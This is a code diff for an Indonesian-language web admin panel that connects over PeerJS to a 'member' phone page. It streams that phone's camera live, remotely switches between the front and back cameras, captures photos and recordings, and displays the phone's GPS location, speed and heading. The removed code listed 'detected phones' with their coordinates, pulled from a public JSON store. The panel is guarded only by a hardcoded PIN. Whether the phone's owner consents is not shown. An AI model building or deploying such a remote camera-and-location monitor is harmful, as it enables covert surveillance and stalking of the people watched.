@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Realtime - Deteksi HP & Koneksi Cepat</title>
+    <title>Admin Realtime - Kamera & Lokasi</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
@@ -32,40 +32,12 @@
         }
         .btn-primary { background: #3b82f6; color: white; }
         .btn-primary:hover { background: #2563eb; }
-        .btn-connect { background: #10b981; color: white; }
-        .btn-connect:hover { background: #059669; }
         .btn-cam { background: #6366f1; color: white; }
         .btn-cam:hover { background: #4f46e5; }
-        .btn-photo { background: #0ea5e9; color: white; }
-        .btn-photo:hover { background: #0284c7; }
+        .btn-photo { background: #10b981; color: white; }
+        .btn-photo:hover { background: #059669; }
         .btn-rec { background: #ef4444; color: white; }
         .btn-rec:hover { background: #dc2626; }
-
-        .devices-box {
-            background: #1e293b; border: 1px solid #334155;
-            border-radius: 14px; padding: 16px; margin-bottom: 20px;
-        }
-        .devices-top {
-            display: flex; justify-content: space-between; align-items: center;
-            flex-wrap: wrap; gap: 10px; margin-bottom: 12px;
-        }
-        .devices-title { font-size: 15px; color: #e2e8f0; }
-        .device-list { display: grid; gap: 10px; }
-        .device-item {
-            background: #0f172a; border: 1px solid #334155; border-radius: 10px;
-            padding: 12px 14px; display: flex; justify-content: space-between;
-            align-items: center; flex-wrap: wrap; gap: 10px;
-        }
-        .device-item strong { font-size: 14px; color: #fff; }
-        .device-item small { display: block; font-size: 11px; color: #94a3b8; margin-top: 3px; }
-        .badge-on {
-            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 999px;
-            background: rgba(34, 197, 94, 0.16); color: #4ade80; margin-left: 6px;
-        }
-        .badge-off {
-            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 999px;
-            background: rgba(148, 163, 184, 0.16); color: #cbd5e1; margin-left: 6px;
-        }
 
         .stage {
             background: #1e293b; border: 1px solid #334155;
@@ -129,20 +101,10 @@
     <div id="dashboard">
         <div class="header">
             <div>
-                <h1>📹 Deteksi HP & Live View</h1>
+                <h1>📹 Live View Realtime</h1>
             </div>
             <div>
-                <button class="btn-primary" onclick="loadDetectedDevices()">🔄 Cek HP Terdeteksi</button>
-            </div>
-        </div>
-
-        <div class="devices-box">
-            <div class="devices-top">
-                <h2 class="devices-title">📱 HP Terdeteksi & Asal Lokasi</h2>
-                <span style="font-size:11px;color:#94a3b8;">Klik Hubungkan → koneksi terhubung ~5 detik</span>
-            </div>
-            <div id="deviceList" class="device-list">
-                <div class="device-item"><div><small>Memeriksa perangkat...</small></div></div>
+                <button class="btn-primary" onclick="connectToMember()">🔌 Hubungkan ke Perangkat</button>
             </div>
         </div>
 
@@ -156,11 +118,11 @@
                     <span class="pill" id="recBadge" style="display:none;background:#dc2626;color:#fff;">● MEREKAM</span>
                 </div>
                 <video id="remoteVideo" autoplay playsinline></video>
-                <span id="placeholderText" style="color:#64748b;font-size:13px;">Pilih HP yang terdeteksi lalu klik Hubungkan.</span>
+                <span id="placeholderText" style="color:#64748b;font-size:13px;">Klik "Hubungkan ke Perangkat" saat halaman member terbuka.</span>
             </div>
 
             <div class="meta-bar">
-                <div id="locText"><strong>Lokasi / Asal HP:</strong> Menunggu data...</div>
+                <div id="locText"><strong>Lokasi:</strong> Menunggu data...</div>
                 <div id="mapLinkWrap"></div>
             </div>
 
@@ -173,22 +135,20 @@
             <div id="statusMsg" class="info-text">Status: Siap.</div>
         </div>
 
-        <h2 style="font-size:16px;margin-bottom:12px;">Hasil Foto & Rekaman Lokal</h2>
+        <h2 style="font-size:16px;margin-bottom:12px;">Hasil Foto & Rekaman Lokal (Sesi Ini)</h2>
         <div id="capturesList" class="captures-grid"></div>
     </div>
 </div>
 
 <script>
     const ADMIN_PIN = "123456";
-    const JSON_URL  = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
+    const ROOM_ID = "jirun-live-room-9988";
 
     let peer = null;
     let dataConn = null;
-    let currentCall = null;
     let currentMediaStream = null;
     let currentCamLabel = "-";
     let currentLoc = null;
-    let connectWatchdog = null;
 
     const remoteVideo = document.getElementById("remoteVideo");
     const placeholderText = document.getElementById("placeholderText");
@@ -199,161 +159,87 @@
     const mapLinkWrap = document.getElementById("mapLinkWrap");
     const statusMsg = document.getElementById("statusMsg");
     const capturesList = document.getElementById("capturesList");
-    const deviceListEl = document.getElementById("deviceList");
 
     function checkPin() {
         const val = document.getElementById("pinInput").value;
         if (val === ADMIN_PIN) {
             document.getElementById("loginScreen").style.display = "none";
             document.getElementById("dashboard").style.display = "block";
-            loadDetectedDevices();
+            connectToMember();
         } else {
             alert("PIN salah!");
-        }
-    }
-
-    async function loadDetectedDevices() {
-        try {
-            const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
-            if (!res.ok) throw new Error("Gagal memuat");
-            const data = await res.json();
-            const devicesMap = data.devices && typeof data.devices === "object" ? data.devices : {};
-            const list = Object.values(devicesMap).sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
-
-            if (list.length === 0) {
-                deviceListEl.innerHTML = `
-                    <div class="device-item">
-                        <div>
-                            <strong>Belum ada HP terdeteksi</strong>
-                            <small>Buka halaman di HP lalu izinkan lokasi & kamera agar HP muncul di sini.</small>
-                        </div>
-                    </div>
-                `;
-                return;
-            }
-
-            deviceListEl.innerHTML = list.map(dev => {
-                const loc = dev.location;
-                const hasLoc = loc && loc.lat !== undefined && loc.lng !== undefined;
-                const locStr = hasLoc ? `${loc.lat}, ${loc.lng} (±${loc.accuracy || "-"})` : "Lokasi belum ada";
-                const mapHref = hasLoc ? `https://www.google.com/maps?q=${loc.lat},${loc.lng}` : "";
-                const ageSec = dev.updatedAt ? Math.max(0, Math.round((Date.now() - dev.updatedAt) / 1000)) : null;
-                const isRecent = ageSec !== null && ageSec <= 120;
-
-                const badge = isRecent
-                    ? `<span class="badge-on">Terdeteksi (${ageSec}d lalu)</span>`
-                    : `<span class="badge-off">Riwayat (${ageSec ?? "-"}d lalu)</span>`;
-
-                return `
-                    <div class="device-item">
-                        <div>
-                            <strong>${escapeHtml(dev.name || "HP Saya")}</strong> ${badge}
-                            <small>Asal Koordinat: ${escapeHtml(locStr)} • Kamera: ${escapeHtml(dev.facing || "Depan")}</small>
-                        </div>
-                        <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
-                            ${hasLoc ? `<a class="btn-map" href="${mapHref}" target="_blank">Cek Asal Maps ↗</a>` : ""}
-                            <button class="btn-connect" onclick="connectWithin5Sec('${escapeHtml(dev.peerId)}')">Hubungkan</button>
-                        </div>
-                    </div>
-                `;
-            }).join("");
-        } catch (err) {
-            deviceListEl.innerHTML = `<div class="device-item"><div><small style="color:#f87171;">Gagal memuat daftar HP.</small></div></div>`;
         }
     }
 
     function updateLocationUI(loc) {
         currentLoc = loc;
         if (!loc || loc.lat === undefined || loc.lng === undefined) {
-            locText.innerHTML = "<strong>Lokasi / Asal HP:</strong> Menunggu koordinat...";
+            locText.innerHTML = "<strong>Lokasi:</strong> Menunggu koordinat...";
             mapLinkWrap.innerHTML = "";
             return;
         }
         locText.innerHTML = `
-            <strong>Lokasi / Asal HP:</strong> ${loc.lat}, ${loc.lng} (${loc.accuracy || "-"}) •
+            <strong>Lokasi:</strong> ${loc.lat}, ${loc.lng} (${loc.accuracy || "-"}) •
             <strong>Kecepatan:</strong> ${loc.speed || "-"} •
             <strong>Arah:</strong> ${loc.heading || "-"}
         `;
         mapLinkWrap.innerHTML = `<a class="btn-map" href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank">Buka Maps ↗</a>`;
     }
 
-    function connectWithin5Sec(peerId) {
-        if (connectWatchdog) {
-            clearTimeout(connectWatchdog);
-            connectWatchdog = null;
+    function connectToMember() {
+        statusMsg.textContent = "Status: Menghubungkan ke perangkat...";
+        if (peer) {
+            peer.destroy();
+            peer = null;
         }
-        if (currentCall) { currentCall.close(); currentCall = null; }
-        if (dataConn) { dataConn.close(); dataConn = null; }
-        if (peer) { peer.destroy(); peer = null; }
-
-        connBadge.textContent = "MENGHUBUNGKAN...";
-        statusMsg.textContent = "Status: Menghubungkan ke HP (target ~5 detik)...";
-
-        let streamConnected = false;
-
-        connectWatchdog = setTimeout(() => {
-            if (!streamConnected) {
-                statusMsg.textContent = "Status: Belum tersambung dalam 5 detik. Pastikan halaman di HP terbuka & sudah diizinkan.";
-            }
-        }, 5000);
-
         peer = new Peer();
 
         peer.on("open", () => {
-            dataConn = peer.connect(peerId);
+            dataConn = peer.connect(ROOM_ID);
             dataConn.on("open", () => {
+                connBadge.textContent = "LIVE TERHUBUNG";
+                statusMsg.textContent = "Status: Terhubung realtime.";
                 dataConn.send({ type: "PING" });
             });
             dataConn.on("data", (msg) => {
                 if (!msg) return;
-                if (msg.type === "LIVE_STATUS") {
+                if (msg.type === "STATUS") {
                     currentCamLabel = msg.facing || "-";
                     camBadge.textContent = "KAMERA: " + currentCamLabel.toUpperCase();
                     updateLocationUI(msg.location);
                 }
             });
             dataConn.on("close", () => {
-                if (!streamConnected) return;
                 connBadge.textContent = "TERPUTUS";
-                statusMsg.textContent = "Status: Koneksi terputus.";
+                statusMsg.textContent = "Status: Koneksi ke perangkat terputus.";
             });
 
+            // Stream kosong untuk menerima stream video dari perangkat member
             const dummyCanvas = document.createElement("canvas");
             dummyCanvas.width = 64;
             dummyCanvas.height = 64;
             const dummyStream = dummyCanvas.captureStream(1);
 
-            currentCall = peer.call(peerId, dummyStream);
-            if (currentCall) {
-                currentCall.on("stream", (remoteStream) => {
-                    streamConnected = true;
-                    if (connectWatchdog) {
-                        clearTimeout(connectWatchdog);
-                        connectWatchdog = null;
-                    }
+            const call = peer.call(ROOM_ID, dummyStream);
+            if (call) {
+                call.on("stream", (remoteStream) => {
                     currentMediaStream = remoteStream;
                     remoteVideo.srcObject = remoteStream;
                     remoteVideo.style.display = "block";
                     placeholderText.style.display = "none";
-                    connBadge.textContent = "LIVE TERHUBUNG";
-                    statusMsg.textContent = "Status: Tersambung realtime ke HP.";
+                    connBadge.textContent = "LIVE STREAM";
                 });
             }
         });
 
         peer.on("error", () => {
-            if (connectWatchdog) {
-                clearTimeout(connectWatchdog);
-                connectWatchdog = null;
-            }
-            connBadge.textContent = "OFFLINE";
-            statusMsg.textContent = "Status: HP tidak aktif atau aplikasi Chrome sudah ditutup.";
+            statusMsg.textContent = "Status: Perangkat belum aktif atau gagal terhubung. Coba klik Hubungkan lagi.";
         });
     }
 
     function switchCamera(facing) {
         if (!dataConn || !dataConn.open) {
-            alert("Hubungkan ke HP terlebih dahulu.");
+            alert("Hubungkan ke perangkat terlebih dahulu.");
             return;
         }
         statusMsg.textContent = "Status: Mengganti kamera...";
@@ -444,11 +330,6 @@
         setTimeout(() => {
             if (recorder.state === "recording") recorder.stop();
         }, 5000);
-    }
-
-    function escapeHtml(text) {
-        if (!text) return "";
-        return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
     }
 </script>
 
